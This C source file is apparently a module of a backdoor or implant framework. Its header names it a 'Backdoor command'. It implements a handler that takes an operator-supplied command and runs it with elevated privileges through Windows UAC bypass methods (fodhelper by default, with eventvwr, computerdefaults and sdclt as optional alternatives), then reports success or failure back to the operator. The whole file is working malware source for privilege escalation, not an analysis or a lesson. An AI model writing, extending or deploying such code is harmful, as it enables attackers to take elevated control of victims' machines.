// chunk: commands/cmd_uac_bypass
// depends: privesc/uac_fodhelper
// provides: cmd_uac_bypass
// note: Backdoor command — UAC bypass via fodhelper (default) or specified method

#ifndef CHUNK_CMD_UAC_BYPASS
#define CHUNK_CMD_UAC_BYPASS

static int cmd_uac_bypass(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    char cmd_to_run[1024] = {0};
    char method[64] = "fodhelper";

    if (args && args_len > 0) {
        char *sep = strchr(args, '|');
        if (sep) {
            DWORD method_len = (DWORD)(sep - args);
            if (method_len < sizeof(method)) {
                memcpy(method, args, method_len);
                method[method_len] = '\0';
            }
            strncpy(cmd_to_run, sep + 1, sizeof(cmd_to_run) - 1);
        } else {
            strncpy(cmd_to_run, args, sizeof(cmd_to_run) - 1);
        }
    }

    if (cmd_to_run[0] == '\0') {
        const char *msg = "FAIL: No command specified. Usage: [method|]command";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    int result = 0;
    if (strcmp(method, "fodhelper") == 0) {
        result = uac_bypass_fodhelper(cmd_to_run);
    }
#ifdef CHUNK_PRIVESC_UAC_EVENTVWR
    else if (strcmp(method, "eventvwr") == 0) {
        result = uac_bypass_eventvwr(cmd_to_run);
    }
#endif
#ifdef CHUNK_PRIVESC_UAC_COMPUTERDEFAULTS
    else if (strcmp(method, "computerdefaults") == 0) {
        result = uac_bypass_computerdefaults(cmd_to_run);
    }
#endif
#ifdef CHUNK_PRIVESC_UAC_SDCLT
    else if (strcmp(method, "sdclt") == 0) {
        result = uac_bypass_sdclt(cmd_to_run);
    }
#endif
    else {
        result = uac_bypass_fodhelper(cmd_to_run);
    }

    if (result) {
        char msg[256];
        snprintf(msg, sizeof(msg), "OK: UAC bypass via %s executed: %s", method, cmd_to_run);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 0;
    } else {
        char msg[256];
        snprintf(msg, sizeof(msg), "FAIL: UAC bypass via %s failed", method);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }
}

#endif
